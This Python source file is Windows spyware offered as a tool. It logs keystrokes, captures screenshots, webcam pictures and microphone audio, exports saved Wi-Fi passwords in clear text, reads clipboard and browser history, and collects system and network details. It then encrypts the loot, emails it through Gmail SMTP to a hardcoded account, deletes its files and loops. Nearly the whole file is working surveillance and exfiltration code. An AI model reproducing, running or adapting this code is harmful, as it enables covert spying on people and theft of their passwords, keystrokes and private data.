"""
'subprocess' used to run new applications.
'socket' used to write to Internet servers.
'win32clipboard' the system grabs the most recent clipboard data and saves it to a file
'os' provides functions for interacting with the operating system.
're' helps you match or find other strings or sets of strings
'smtplib' which defines an SMTP client session object
'logging' allows writing status messages to a file or any other output streams.
'pathlib' deals with path related tasks
'time' representing time, waiting during code execution & measuring the efficiency of your code.
'cv2' image processing, video capture
'sounddevice' play and record NumPy arrays containing audio signals
'shutil' automating process of copying and removal of files and directories
"""
import subprocess, socket, win32clipboard, os, re, smtplib, logging, pathlib, json, time, cv2, sounddevice, shutil
import requests   # send HTTP/1.1 requests using Python
import browserhistory as bh   # used to obtain the browser username, database paths, and history in JSON format
from multiprocessing import Process   # supports spawning processes
from pynput.keyboard import Key, Listener   # monitor input devices
from PIL import ImageGrab   # copy the contents of the screen or the clipboard to a PIL image memory
from scipy.io.wavfile import write as write_rec   # Write a NumPy array as a WAV file
from cryptography.fernet import Fernet    # message encrypted using it cannot be manipulated or read without the key
from email.mime.multipart import MIMEMultipart    # encodes ['From'], ['To'], and ['Subject']
from email.mime.text import MIMEText    # sending text emails
from email.mime.base import MIMEBase    # adds a Content-Type header
from email import encoders    # encoders

################################################## Keystroke Capture Funtion ##################################################
def logg_keys(file_path):
    logging.basicConfig(filename = (file_path + 'key_logs.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')
    on_press = lambda Key : logging.info(str(Key))    # Log the Pressed Keys
    
    # Collect events until released
    with Listener(on_press=on_press) as listener:
        listener.join()

######################################### Loop that saves a screenshot every 5 seconds #########################################
def screenshot(file_path):
    pathlib.Path('C:/Users/Public/Logs/Screenshots').mkdir(parents=True, exist_ok=True)
    screen_path = file_path + 'Screenshots\\'

    for x in range(0,10):
        pic = ImageGrab.grab()
        pic.save(screen_path + 'screenshot{}.png'.format(x))
        time.sleep(5) # Gap between the each screenshot in sec

#### Loop that records the microphone for 60 second intervals; which is necessary to meet email attachment size limitations ####
def microphone(file_path):
    for x in range(0, 1):
        fs = 44100
        seconds = 10
        myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
        sounddevice.wait() # To check if the recording is finished
        write_rec(file_path + '{}mic_recording.wav'.format(x), fs, myrecording)

########################################### Loop that save a picture every 5 seconds ###########################################
def webcam(file_path):
    pathlib.Path('C:/Users/Public/Logs/WebcamPics').mkdir(parents=True, exist_ok=True)
    cam_path = file_path + 'WebcamPics\\'
    cam = cv2.VideoCapture(0)

    for x in range(0, 10):
        ret, img = cam.read()
        file = (cam_path  + '{}.jpg'.format(x))
        cv2.imwrite(file, img)
        time.sleep(5)
 
    cam.release   # Closes video file or capturing device
    cv2.destroyAllWindows

######### All the above mentioned functions run simultaneously for 5 minutes and terminate when the timeout is complete. #########
    
def email_base(name, email_address):
    name['From'] = email_address
    name['To'] =  email_address
    name['Subject'] = 'Success!!!'
    body = 'Mission is completed'
    name.attach(MIMEText(body, 'plain'))
    return name

def smtp_handler(email_address, password, name):
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email_address, password)
    s.sendmail(email_address, email_address, name.as_string())
    s.quit()

######## Google's attachement limit is 25 MB per email. We have 1 video around 20 MB. So, to send multiple files we do this: #######
def send_email(path): 
    regex = re.compile(r'.+\.xml$')
    regex2 = re.compile(r'.+\.txt$')
    regex3 = re.compile(r'.+\.png$')
    regex4 = re.compile(r'.+\.jpg$')
    regex5 = re.compile(r'.+\.wav$')

    email_address = 'quitehacker@instagram.com'                      #<--- Enter your email address
    password = 'QuieHacker#2021'                           #<--- Enter email password 
    
    msg = MIMEMultipart()
    email_base(msg, email_address) # To craft the base information of the email

    exclude = set(['Screenshots', 'WebcamPics'])
    for dirpath, dirnames, filenames in os.walk(path, topdown=True):    # Select all the files in the specified path
        dirnames[:] = [d for d in dirnames if d not in exclude]
        for file in filenames:
            # For each file in the filenames in the specified path, it will try to match the file extension to one of the regex variables.
			      # If one of the first four regex variables match, then all of files of that data type will be attached to a single email message.
            if regex.match(file) or regex2.match(file) or regex3.match(file) or regex4.match(file):
                p = MIMEBase('application', "octet-stream")
                with open(path + '\\' + file, 'rb') as attachment:
                    p.set_payload(attachment.read())    # Match
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment;' 'filename = {}'.format(file))
                msg.attach(p)   # Attach to email

            # If regex5(WAV) variable matches, then that single match will be attached to its own individual email and sent.
            elif regex5.match(file):
                msg_alt = MIMEMultipart()
                email_base(msg_alt, email_address)
                p = MIMEBase('application', "octet-stream")
                with open(path + '\\' + file, 'rb') as attachment:
                    p.set_payload(attachment.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', 'attachment;' 'filename = {}'.format(file))
                msg_alt.attach(p)

                smtp_handler(email_address, password, msg_alt)
            
            # If there are no matches then pass is called to keep the program moving.
            else:
                pass
    
    # To send any of the non WAV files
    smtp_handler(email_address, password, msg)

# Once main is initiated the program begins by creating a directory to store the data it will gather.
def main():
    pathlib.Path('C:/Users/Public/Logs').mkdir(parents=True, exist_ok=True)
    file_path = 'C:\\Users\\Public\\Logs\\'

############################### Retrieve Network/Wifi informaton for the network_wifi file ######################################
    with open(file_path + 'network_wifi.txt', 'a') as network_wifi:
        try:
            # Using the subprocess module a shell executes the specified commands with the standard output and error directed to the log file.
            commands = subprocess.Popen([ 'Netsh', 'WLAN', 'export', 'profile', 'folder=C:\\Users\\Public\\Logs\\', 'key=clear', '&', 'ipconfig', '/all', '&', 'arp', '-a', '&', 'getmac', '-V', '&', 'route', 'print', '&', 'netstat', '-a'], stdout=network_wifi, stderr=network_wifi, shell=True)
            outs, errs = commands.communicate(timeout=60) # The communicate funtion is used to initiate a 60 second timeout for the shell.

        # When the timeout ends the process is killed and communicate is used to alert the system the process has been terminated.
        except subprocess.TimeoutExpired:
            commands.kill()
            out, errs = commands.communicate()

#################################### Retrieve system information for the system_info file ####################################
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)

    with open(file_path + 'system_info.txt', 'a') as system_info:
        try:
            public_ip = requests.get('https://api.ipify.org').text
        except requests.ConnectionError:
            public_ip = '* Ipify connection failed *'
            pass

        system_info.write('Public IP Address: ' + public_ip + '\n' \
                          + 'Private IP Address: ' + IPAddr + '\n')
        try:
            get_sysinfo = subprocess.Popen(['systeminfo', '&', 'tasklist', '&', 'sc', 'query'], stdout=system_info, stderr=system_info, shell=True)
            outs, errs = get_sysinfo.communicate(timeout=15)

        except subprocess.TimeoutExpired:
            get_sysinfo.kill()
            outs, errs = get_sysinfo.communicate()

################################## Grab the most recent clipboard data and saves it to a file ##################################
    win32clipboard.OpenClipboard()
    pasted_data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    with open(file_path + 'clipboard_info.txt', 'a') as clipboard_info:
        clipboard_info.write('Clipboard Data: \n' + pasted_data)

############################# Get the browser username, database paths, and history in JSON format #############################
    browser_history = []
    bh_user = bh.get_username()
    db_path = bh.get_database_paths()
    hist = bh.get_browserhistory()
    browser_history.extend((bh_user, db_path, hist))
    with open(file_path + 'browser.txt', 'a') as browser_txt:
        browser_txt.write(json.dumps(browser_history))

########## Using Multiprocess module to log keystrokes, get screenshots, record microphone as well as webcam pictures ##########
    p1 = Process(target=logg_keys, args=(file_path,)) ; p1.start()
    p2 = Process(target=screenshot, args=(file_path,)) ; p2.start()
    p3 = Process(target=microphone, args=(file_path,)) ; p3.start()
    p4 = Process(target=webcam, args=(file_path,)) ; p4.start()
    
    # To stop execution of current program until a process is complete
    p1.join(timeout=300) ; p2.join(timeout=300) ; p3.join(timeout=300) ; p4.join(timeout=300)
    p1.terminate() ; p2.terminate() ; p3.terminate() ; p4.terminate()

######################################################### Encrypt files #########################################################
    files = [ 'network_wifi.txt', 'system_info.txt', 'clipboard_info.txt', 'browser.txt', 'key_logs.txt' ]

    regex = re.compile(r'.+\.xml$')   # Collect all the files ending with xml extension
    dir_path = 'C:\\Users\\Public\\Logs'    # Feed in some files to match

    for dirpath, dirnames, filenames in os.walk(dir_path):
        [ files.append(file) for file in filenames if regex.match(file) ]

    """
    To generate a key: Do the Following in the Python Console->
	  from cryptography.fernet import Fernet
	  Fernet.generate_key()
	  """
    key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='

    for file in files:
        with open(file_path + file, 'rb') as plain_text:    # Opens the file in binary format for reading
            data = plain_text.read()
        encrypted = Fernet(key).encrypt(data)
        with open(file_path + 'e_' + file, 'ab') as hidden_data:    # Appending to the end of the file if it exists
            hidden_data.write(encrypted)
        os.remove(file_path + file)

########################################### Send encrypted files to email account ###########################################
    send_email('C:\\Users\\Public\\Logs')
    send_email('C:\\Users\\Public\\Logs\\Screenshots')
    send_email('C:\\Users\\Public\\Logs\\WebcamPics')

    # Clean Up Files
    shutil.rmtree('C:\\Users\\Public\\Logs')

    # Loop
    main()

# When an error occurs a detailed full stack trace can be logged to a file for an admin; while the user receives a much more vague message preventing information leakage.
if __name__ == '__main__':
    try:
        main()

    except KeyboardInterrupt:
        print('* Control-C entered...Program exiting *')

    except Exception as ex:
        logging.basicConfig(level=logging.DEBUG, filename='C:/Users/Public/Logs/error_log.txt')
        logging.exception('* Error Ocurred: {} *'.format(ex))
        pass
